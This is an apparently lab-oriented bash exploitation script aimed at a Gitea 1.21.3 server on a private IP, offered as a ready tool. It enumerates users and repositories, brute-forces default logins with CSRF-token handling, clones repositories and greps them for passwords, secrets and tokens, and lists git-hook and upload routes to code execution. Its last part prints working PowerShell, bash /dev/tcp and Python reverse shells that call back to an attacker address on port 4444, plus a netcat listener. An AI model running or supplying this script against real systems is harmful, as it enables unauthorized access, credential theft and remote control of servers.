#!/bin/bash
# SYSTEM 4: LOCK - Gitea Exploitation Script
# Target: Gitea 1.21.3 on port 3000

S4_IP="10.129.6.226"
OUTPUT_DIR="$HOME/Downloads/system4_exploit_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

cd "$OUTPUT_DIR"

echo "=========================================="
echo "SYSTEM 4: LOCK - Gitea Exploitation"
echo "=========================================="
echo "Target: $S4_IP"
echo "Gitea: http://$S4_IP:3000"
echo ""

# ============================================
# PHASE 1: Gitea Status Check
# ============================================
echo "[*] Phase 1: Checking Gitea Status"
echo ""

# Check Gitea version
echo "[+] Checking Gitea version..."
curl -s http://$S4_IP:3000/api/v1/version > 01_gitea_version.txt
cat 01_gitea_version.txt

# Check if registration is enabled
echo ""
echo "[+] Checking if registration is enabled..."
curl -s http://$S4_IP:3000/user/sign_up > 02_registration_page.txt
if grep -qi "register\|sign.*up\|create.*account" 02_registration_page.txt 2>/dev/null; then
    echo "[!] Registration appears to be enabled!"
    echo "REGISTRATION_ENABLED" > registration_status.txt
else
    echo "[-] Registration might be disabled"
fi

# ============================================
# PHASE 2: User Enumeration
# ============================================
echo ""
echo "[*] Phase 2: User Enumeration"
echo ""

# Search for users
echo "[+] Searching for users..."
curl -s "http://$S4_IP:3000/api/v1/users/search?q=admin" > 03_users_admin.txt
curl -s "http://$S4_IP:3000/api/v1/users/search?q=a" > 04_users_all.txt

cat 03_users_admin.txt
echo ""
cat 04_users_all.txt | head -20

# Enumerate public repositories
echo ""
echo "[+] Enumerating public repositories..."
curl -s "http://$S4_IP:3000/api/v1/repos/search?limit=50" > 05_repos.txt
cat 05_repos.txt | head -50

# ============================================
# PHASE 3: Authentication Attempts
# ============================================
echo ""
echo "[*] Phase 3: Authentication Attempts"
echo ""

# Try default credentials
echo "[+] Trying default credentials..."
for user in admin Admin gitea Gitea administrator Administrator root; do
    for pass in admin Admin gitea Gitea password Password123 admin123; do
        echo "Trying: $user:$pass"
        
        # Get CSRF token first
        CSRF=$(curl -s -c cookies.txt http://$S4_IP:3000/user/login | grep -oP 'name="_csrf" value="\K[^"]*')
        
        if [ -n "$CSRF" ]; then
            # Try login
            curl -s -X POST http://$S4_IP:3000/user/login \
                -d "user_name=$user&password=$pass&_csrf=$CSRF" \
                -b cookies.txt -c cookies.txt \
                -L -o login_${user}_${pass}.html 2>&1 | head -5
            
            # Check if login was successful
            if grep -qi "dashboard\|repositories\|settings" login_${user}_${pass}.html 2>/dev/null; then
                echo "[!] POSSIBLE SUCCESS: $user:$pass"
                echo "$user:$pass" > CREDENTIALS_FOUND.txt
                echo "$CSRF" > csrf_token.txt
            fi
        fi
    done
done

# ============================================
# PHASE 4: Repository Enumeration & Credential Mining
# ============================================
echo ""
echo "[*] Phase 4: Repository Enumeration"
echo ""

# If we have credentials, clone repositories
if [ -f CREDENTIALS_FOUND.txt ]; then
    echo "[+] Credentials found! Attempting to clone repositories..."
    
    CREDS=$(cat CREDENTIALS_FOUND.txt | head -1)
    USER=$(echo $CREDS | cut -d: -f1)
    PASS=$(echo $CREDS | cut -d: -f2)
    
    # Clone repositories and search for credentials
    mkdir -p repos
    cd repos
    
    # Extract repository URLs from API
    if [ -f ../05_repos.txt ]; then
        grep -oP '"clone_url":"\K[^"]*' ../05_repos.txt | while read repo_url; do
            repo_name=$(basename "$repo_url" .git)
            echo "[+] Cloning $repo_name..."
            git clone "$repo_url" "$repo_name" 2>&1 | head -5
            
            if [ -d "$repo_name" ]; then
                cd "$repo_name"
                echo "[+] Searching for credentials in $repo_name..."
                grep -r -i "password\|secret\|api.*key\|token" . 2>/dev/null | head -10 > ../../credentials_${repo_name}.txt
                find . -name ".env" -o -name "config.*" -o -name "*.config" 2>/dev/null > ../../config_files_${repo_name}.txt
                cd ..
            fi
        done
    fi
    
    cd ..
fi

# ============================================
# PHASE 5: Gitea Exploitation Research
# ============================================
echo ""
echo "[*] Phase 5: Gitea Exploitation Research"
echo ""

# Search for Gitea exploits
echo "[+] Searching for Gitea exploits..."
searchsploit gitea > 06_gitea_exploits.txt 2>&1
cat 06_gitea_exploits.txt | head -30

# Search for Gitea 1.21.x exploits
echo ""
echo "[+] Searching for Gitea 1.21.x exploits..."
searchsploit gitea 1.21 > 07_gitea_121_exploits.txt 2>&1
cat 07_gitea_121_exploits.txt

# ============================================
# PHASE 6: Gitea RCE Attempts
# ============================================
echo ""
echo "[*] Phase 6: Gitea RCE Attempts"
echo ""

if [ -f CREDENTIALS_FOUND.txt ]; then
    echo "[+] Credentials found! Attempting RCE..."
    echo ""
    echo "Gitea RCE methods to try:"
    echo ""
    echo "1. Git Hooks RCE (if you can create/edit repositories):"
    echo "   - Create a repository"
    echo "   - Add a post-receive hook with reverse shell"
    echo "   - Push to trigger the hook"
    echo ""
    echo "2. File Upload RCE (if file upload is allowed):"
    echo "   - Upload a malicious file via repository"
    echo "   - Access it via web interface"
    echo ""
    echo "3. Template Injection (if applicable):"
    echo "   - Check for template injection in Gitea templates"
    echo ""
    echo "4. Check for specific CVE exploits:"
    echo "   - CVE-2022-30781 (if applicable to 1.21.3)"
    echo "   - CVE-2023-XXXX (check for 1.21.3 specific)"
    echo ""
    echo "Manual steps:"
    echo "1. Login to Gitea: http://$S4_IP:3000/user/login"
    echo "2. Create a new repository"
    echo "3. Add a file with reverse shell payload"
    echo "4. Or use Git hooks for RCE"
    echo ""
else
    echo "[-] No credentials found. RCE requires authentication."
    echo ""
    echo "Try:"
    echo "1. Register account (if registration enabled)"
    echo "2. Brute force credentials"
    echo "3. Check public repositories for credentials"
fi

# ============================================
# PHASE 7: Reverse Shell Payloads
# ============================================
echo ""
echo "=========================================="
echo "REVERSE SHELL PAYLOADS"
echo "=========================================="
echo ""
echo "If you gain RCE, use these payloads:"
echo ""
echo "PowerShell Reverse Shell:"
echo 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\"YOUR_IP\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
echo ""
echo "Bash Reverse Shell (if WSL available):"
echo "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
echo ""
echo "Python Reverse Shell:"
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
echo ""
echo "Set up listener:"
echo "nc -lvp 4444"
echo ""

# ============================================
# SUMMARY
# ============================================
echo "=========================================="
echo "EXPLOITATION ATTEMPT COMPLETE"
echo "=========================================="
echo "Results saved to: $OUTPUT_DIR"
echo ""
ls -lh "$OUTPUT_DIR" | head -20
echo ""
echo "Next steps:"
echo "1. Review Gitea version (01_gitea_version.txt)"
echo "2. Check registration status (registration_status.txt)"
echo "3. Check for credentials (CREDENTIALS_FOUND.txt)"
echo "4. Review exploit search results (06_gitea_exploits.txt)"
echo "5. If authenticated, try Git hooks RCE or file upload"
echo "6. Research Gitea 1.21.3 specific CVEs"

